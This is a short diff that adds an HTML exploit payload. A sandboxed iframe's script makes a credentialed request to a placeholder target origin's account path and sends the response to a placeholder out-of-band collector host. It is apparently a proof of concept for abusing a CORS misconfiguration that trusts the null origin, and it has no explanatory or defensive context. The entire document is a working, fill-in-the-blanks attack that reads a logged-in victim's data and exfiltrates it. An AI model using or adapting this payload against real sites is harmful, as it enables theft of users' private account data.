@@ -1,0 +1,10 @@
+<iframe sandbox="allow-scripts" srcdoc="
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = function(){ location='https://YOUR-OAST/log?d='+encodeURIComponent(this.responseText); };
+  req.open('GET','https://TARGET_ORIGIN/ACCOUNT_PATH',true);
+  req.withCredentials = true;
+  req.send();
+</script>
+"></iframe>
+
